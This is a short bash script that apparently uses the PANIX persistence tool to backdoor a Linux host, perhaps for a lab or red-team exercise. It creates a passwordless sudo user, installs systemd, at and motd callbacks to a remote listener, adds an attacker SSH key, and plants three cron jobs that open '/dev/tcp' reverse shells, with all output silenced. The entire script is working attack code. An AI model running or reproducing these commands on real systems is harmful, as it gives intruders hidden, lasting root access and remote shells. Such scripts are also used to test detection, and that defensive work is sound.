#!/bin/bash



# Create Admin User sloppyjoe
adduser --disabled-password --gecos "" "sloppyjoe" >/dev/null
usermod -aG sudo,adm "sloppyjoe" >/dev/null
 
# Service creation
bash /tmp/totally-innocent/panix.sh -q --systemd --default --ip 192.168.34.3 --port 4445 >/dev/null 
 
# at job creation
bash /tmp/totally-innocent/panix.sh -q --at --default --ip 192.168.34.3 --port 4446 --time "now + 24 hours" >/dev/null
 
# authorized_keys persistence
bash /tmp/totally-innocent/panix.sh -q --authorized-keys --default --key "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDubTGnY3TWk4ycUJg9E+VpkjCp1hcim4XdVioWtTUOf hacker@getpwned.com" >/dev/null

#cron   
bash /tmp/totally-innocent/panix.sh --cron --custom --command "/bin/bash -c 'sh -i >& /dev/tcp/192.168.34.3/4447 0>&1'" --daily --name "evil_cron_job" >/dev/null
 
bash /tmp/totally-innocent/panix.sh --cron --custom --command "* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/192.168.34.3/4448 0>&1'" --crond --name "evil_cron_job" >/dev/null
 
bash /tmp/totally-innocent/panix.sh --cron --custom --command "* * * * * /bin/bash -c 'sh -i >& /dev/tcp/192.168.34.3/4449 0>&1'" --crontab >/dev/null

#motd
sudo ./panix.sh --motd --default --ip 192.168.34.3 --port 4450



 
